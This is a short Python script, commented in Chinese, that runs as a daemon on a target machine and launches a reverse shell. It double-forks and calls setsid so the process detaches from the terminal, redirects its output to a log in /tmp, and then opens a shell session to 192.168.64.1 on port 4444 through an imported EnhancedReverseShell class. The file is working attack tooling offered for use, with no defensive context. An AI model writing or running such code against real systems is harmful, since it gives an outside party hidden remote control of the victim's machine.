"""
守护进程启动脚本 - 在目标机器后台运行反向Shell，不占用终端
用法：python3 agent.py
"""
import os
import sys

# 双fork让进程脱离终端，成为真正的守护进程
# 第一次fork：父进程退出，子进程脱离进程组
if os.fork() > 0:
    sys.exit(0)

# 创建新会话，彻底脱离控制终端
os.setsid()

# 第二次fork：防止进程重新获得控制终端
if os.fork() > 0:
    sys.exit(0)

# 标准输入重定向到 /dev/null，日志写到文件
sys.stdin = open('/dev/null', 'r')
log = open('/tmp/reverse_shell.log', 'a')
sys.stdout = log
sys.stderr = log

from ForTarget import EnhancedReverseShell

shell = EnhancedReverseShell(host='192.168.64.1', port=4444)
shell.shell_session()
